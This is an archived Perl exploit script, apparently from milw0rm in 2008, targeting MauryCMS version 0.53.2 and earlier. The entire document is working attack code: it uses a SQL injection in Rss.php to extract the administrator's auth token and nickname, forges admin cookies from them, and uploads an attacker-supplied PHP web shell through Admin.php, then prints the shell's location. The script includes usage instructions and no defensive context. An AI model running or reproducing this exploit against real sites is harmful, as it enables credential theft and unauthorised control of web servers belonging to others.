<html><head><title>MauryCMS <= 0.53.2 Remote Shell Upload Exploit</title></head><pre>#!/usr/bin/perl 

=about
 
   MauryCMS &lt;= 0.53.2 Remote Shell Upload Exploit
   ----------------------------------------------
   by athos - staker[at]hotmail[dot]it
   download on http://cms.maury91.org
   thnx Osirys
   
=cut


use strict;
use warnings;
use LWP::UserAgent;

my ($http,$post,$user,$pass,@auth,@read,$shell);

my $host = shift @ARGV;
my $file = shift @ARGV or &amp;usage;

open(FILE,$file) or die(&quot;file error!\n&quot;);

@read = &lt;FILE&gt;;

foreach(@read) 
{
  $shell .= $_;
}

close(FILE);

&amp;usage if $host !~ /http:\/\/(.+?)$/i &amp;&amp; $file !~ /[a-zA-Z](\.php)/i;


my @path = split /\//,substr($host,7);


$http = new LWP::UserAgent(
                            agent =&gt; &quot;Mozilla/4.5 [en] (Win95; U)&quot;,
                          );

@auth = split(':',get_cookies());

if(not defined($path[1]))
{
  $user = qq{_nick=${auth[1]}; path=/; };
  $pass = qq{_sauth=${auth[0]}; path=/;};
}
else
{
  $user = qq{/${path[1]}_nick=${auth[1]}; path=/; };
  $pass = qq{/${path[1]}_sauth=${auth[0]}; path=/;};
}



$http-&gt;default_header('Cookie' =&gt; $user.$pass);

$post = $http-&gt;post($host.'/Admin.php',[
                                         'zone'     =&gt; 'Modify',
                                         'txtfname' =&gt; $file,
                                         'txttext'  =&gt; $shell,
                                       ]);               

if($post-&gt;is_success  &amp;&amp; $post-&gt;as_string =~ /File Scritto/i)
{
  print STDOUT &quot;Exploit Successfully!\n&quot;;
  print STDOUT &quot;$host/$file\n&quot;;
  exit;
}
else
{
  print STDOUT &quot;Exploit Failed!\n&quot;;
  exit;
}


sub get_cookies
{
  my ($query,$cookie,$content);

  $query = &quot;/Rss.php?c=-1+union+select+1,concat(sauth,0x3a,nick),&quot;.
           &quot;3,4,5,6,7,8,9+from+mcms_users+where+id=1--&quot;;
              
 
  $cookie = $http-&gt;get($host.$query);
  $content = $cookie-&gt;content;
 
  if($cookie-&gt;is_success &amp; $content =~ /&lt;title&gt;(.+?)&lt;\/title&gt;/i)
  {
    return $1;
  }
}


sub usage
{
  print STDOUT &quot;MauryCMS &lt;= 0.53.2 Remote Shell Upload Exploit\n&quot;.
               &quot;by athos - staker[at]hotmail[dot]it\n&quot;.
               &quot;----------------------------------------------\n&quot;.
               &quot;Usage: perl $0 http://[host] [name_shell.php]\n&quot;.
               &quot;Usage: perl $0 http://localhost/cms shell.php\n&quot;;
  exit;
}

# milw0rm.com [2008-11-19]</pre></html>